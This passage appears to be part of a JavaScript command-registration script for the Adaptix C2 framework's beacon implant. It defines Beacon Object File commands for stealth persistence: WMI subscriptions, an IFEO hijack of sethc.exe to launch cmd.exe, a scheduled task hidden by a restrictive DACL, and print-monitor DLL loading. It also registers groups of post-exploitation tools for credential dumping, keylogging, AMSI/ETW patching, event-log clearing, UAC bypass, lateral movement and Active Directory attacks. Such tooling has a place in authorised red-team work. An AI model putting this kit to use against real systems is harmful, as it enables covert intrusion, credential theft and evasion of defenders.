cmd_wmisubscription.addArgString("name", true, "Filter/consumer/binding name");
cmd_wmisubscription.addArgString("command", true, "Command line, or remove");
cmd_wmisubscription.addArgString("filter", "Custom WQL event filter", "");
cmd_wmisubscription.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["name"], parsed_json["command"], parsed_json["filter"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wmisubscription")}" ${params}`, "BOF: wmisubscription");
});

var cmd_ifeo = ax.create_command("bof-ifeo", "Image File Execution Options debugger hijack", "bof-ifeo sethc.exe \"C:\\Windows\\System32\\cmd.exe\"");
cmd_ifeo.addArgString("exe", true, "Target image name");
cmd_ifeo.addArgString("command", true, "Debugger command line, or remove");
cmd_ifeo.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["exe"], parsed_json["command"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ifeo")}" ${params}`, "BOF: ifeo");
});

var cmd_ghost_task = ax.create_command("bof-ghost-task", "Register a scheduled task then hide it with a restrictive DACL", "bof-ghost-task Updater C:\\Windows\\System32\\cmd.exe /c calc.exe");
cmd_ghost_task.addArgString("name", true, "Task name in the root folder");
cmd_ghost_task.addArgString("command", true, "Executable to run, or remove");
cmd_ghost_task.addArgString("args", "Command arguments", "");
cmd_ghost_task.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["name"], parsed_json["command"], parsed_json["args"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ghost-task")}" ${params}`, "BOF: ghost-task");
});

var cmd_printmonitor = ax.create_command("bof-printmonitor", "Register a print monitor DLL and optionally restart the Spooler", "bof-printmonitor AcmeMon C:\\Windows\\Temp\\acmemon.dll");
cmd_printmonitor.addArgString("name", true, "Monitor registry name");
cmd_printmonitor.addArgString("dll", true, "Monitor DLL path, or remove");
cmd_printmonitor.addArgString("restart", "restart or norestart", "restart");
cmd_printmonitor.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["name"], parsed_json["dll"], parsed_json["restart"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "printmonitor")}" ${params}`, "BOF: printmonitor");
});

var cmd_patchwow64 = ax.create_command("bof-patchwow64", "Restore executable sections of a WOW64 module from disk", "bof-patchwow64 1234");
cmd_patchwow64.addArgString("target", true, "Target PID or process name");
cmd_patchwow64.addArgString("dll", "Clean DLL path (empty = target's wow64cpu.dll)", "");
cmd_patchwow64.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["target"], parsed_json["dll"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "patchwow64")}" ${params}`, "BOF: patchwow64");
});

var cmd_handlestrip = ax.create_command("bof-handlestrip", "Close foreign PROCESS_VM_READ handles into this process", "bof-handlestrip");
cmd_handlestrip.addArgString("mode", "Empty for PROCESS_VM_READ only, all for any access", "");
cmd_handlestrip.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "handlestrip")}" ${params}`, "BOF: handlestrip");
});

var cmd_aclprotect = ax.create_command("bof-aclprotect", "Restrict this process DACL to SYSTEM (or restore)", "bof-aclprotect protect");
cmd_aclprotect.addArgString("mode", "protect or restore", "protect");
cmd_aclprotect.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "aclprotect")}" ${params}`, "BOF: aclprotect");
});

/* ------------------------------------------------------------------ */
/* Registration                                                        */
/* ------------------------------------------------------------------ */

var group_recon = ax.create_commands_group("AdaptixBOFKit-Recon", [
    cmd_whoami, cmd_env, cmd_ipconfig, cmd_arp, cmd_netstat, cmd_routeprint,
    cmd_uptime, cmd_listpipes, cmd_drives, cmd_locale, cmd_resources,
    cmd_windowlist, cmd_listmods, cmd_sessions, cmd_dir, cmd_proclist,
    cmd_services, cmd_drivers,
    cmd_useridletime, cmd_sessioninfo, cmd_regqueryrec, cmd_auditpol,
    cmd_findmodule, cmd_filterdrivers, cmd_scenum, cmd_regsession,
    cmd_edrrecon, cmd_enumsysmon, cmd_whereami, cmd_enumrwx,
    cmd_vulndrivers, cmd_enumdotnet, cmd_safeharbor, cmd_enumdrives, cmd_enumlib,
    cmd_cacls, cmd_geolocation, cmd_evtxsearch, cmd_finduserhooks,
    cmd_enumhandles, cmd_enumhandles_alias, cmd_processhandles,
    cmd_processhandles_alias, cmd_killprocess, cmd_vssenum, cmd_wfpenum,
    cmd_tasklist, cmd_netconn, cmd_driversigs, cmd_wmi_query, cmd_msi_search,
    cmd_screenspy, cmd_keylogger, cmd_browserhist, cmd_findcreds
]);
ax.register_commands_group(group_recon, ["beacon"], ["windows"], []);

var group_network = ax.create_commands_group("AdaptixBOFKit-Network", [
    cmd_portscan, cmd_nslookup, cmd_netshares, cmd_netview, cmd_netuse,
    cmd_netuse_list, cmd_nettime, cmd_netloggedon, cmd_netsession,
    cmd_listdns, cmd_probe, cmd_smbinfo, cmd_enumwebclient,
    cmd_portscanbof, cmd_netsession2, cmd_netuse_add, cmd_nbtscan,
    cmd_smbexec, cmd_wmiexec, cmd_dcomexec, cmd_scshell, cmd_winrm_exec
]);
ax.register_commands_group(group_network, ["beacon"], ["windows"], []);

var group_ad = ax.create_commands_group("AdaptixBOFKit-AD", [
    cmd_netuser, cmd_netlocalgroups, cmd_netlocalgroupmembers,
    cmd_domaingroups, cmd_netgroupmembers, cmd_passwordpolicy, cmd_domaininfo,
    cmd_ldapsearch, cmd_addmachineaccount, cmd_lapsdump,
    cmd_netgrouplist, cmd_netgrouplistmembers, cmd_netgrouplistmembers2,
    cmd_netlocalgrouplist, cmd_netlocalgrouplistmembers, cmd_get_password_policy,
    cmd_adcs_enum, cmd_adcs_enum_com, cmd_adcs_enum_com2, cmd_ldapsecuritycheck,
    cmd_kerberoast, cmd_spnroast, cmd_asreproast, cmd_gpocheck, cmd_trustdump,
    cmd_dacledit, cmd_shadowcred, cmd_rbcd, cmd_dnsdump, cmd_groupmanagedpw
]);
ax.register_commands_group(group_ad, ["beacon"], ["windows"], []);

var group_creds = ax.create_commands_group("AdaptixBOFKit-Creds", [
    cmd_credman, cmd_wifi, cmd_autologon,
    cmd_procdump, cmd_regsave, cmd_dpapissystem, cmd_certdump,
    cmd_clipboard, cmd_notethief, cmd_klist, cmd_kerbhash,
    cmd_dumpwifi, cmd_wifipasswords,
    cmd_vaultdump, cmd_dpapiblobdec, cmd_chromecreds, cmd_recentfiles,
    cmd_sshagentkeys, cmd_lsasecrets, cmd_dpapimasterkey, cmd_vaultdump_full,
    cmd_chromecreds_abe
]);
ax.register_commands_group(group_creds, ["beacon"], ["windows"], []);

var group_privesc = ax.create_commands_group("AdaptixBOFKit-Privesc-Evasion", [
    cmd_tokenpriv, cmd_uacstatus, cmd_unhook, cmd_etwpatch, cmd_amsipatch,
    cmd_hidefile, cmd_cleareventlog, cmd_addexclusion,
    cmd_enableefs, cmd_blindeventlog, cmd_enumexclusions, cmd_delexclusion,
    cmd_get_priv, cmd_startwebclient, cmd_dllhijack,
    cmd_maketoken, cmd_stealtoken, cmd_reverttoken, cmd_listimpersonation,
    cmd_getsystem_svc, cmd_injectapc, cmd_injectthread, cmd_earlybird,
    cmd_ghostwrite, cmd_ppidspoof, cmd_blockdlls, cmd_acldeny,
    cmd_timestomp, cmd_schtaskshide, cmd_threadhide, cmd_uacbypass,
    cmd_printspoofer, cmd_patchwow64, cmd_handlestrip, cmd_aclprotect
]);
ax.register_commands_group(group_privesc, ["beacon"], ["windows"], []);

var group_persist = ax.create_commands_group("AdaptixBOFKit-Persistence", [
    cmd_regquery, cmd_regset, cmd_regdelete, cmd_runkey,
    cmd_svccreate, cmd_svcdelete, cmd_svcconfig, cmd_svcstart, cmd_svcstop,
    cmd_schtasksenum, cmd_schtasksquery, cmd_schtaskscreate,
    cmd_schtasksdelete, cmd_schtasksrun, cmd_addtaskscheduler,
    cmd_deltaskscheduler, cmd_comhunter, cmd_trustme, cmd_addlocalcert,
    cmd_addfirewallrule, cmd_lnkgenerator, cmd_wmisubscription, cmd_ifeo,
    cmd_ghost_task, cmd_printmonitor
]);
ax.register_commands_group(group_persist, ["beacon"], ["windows"], []);

var group_post = ax.create_commands_group("AdaptixBOFKit-Post", [
    cmd_inject, cmd_hashfile, cmd_download,
    cmd_screenshot, cmd_enumfiles, cmd_md5, cmd_sha1, cmd_sha256,
    cmd_executesession, cmd_selfdelete, cmd_prefetchdel, cmd_clearmplog
]);
ax.register_commands_group(group_post, ["beacon"], ["windows"], []);
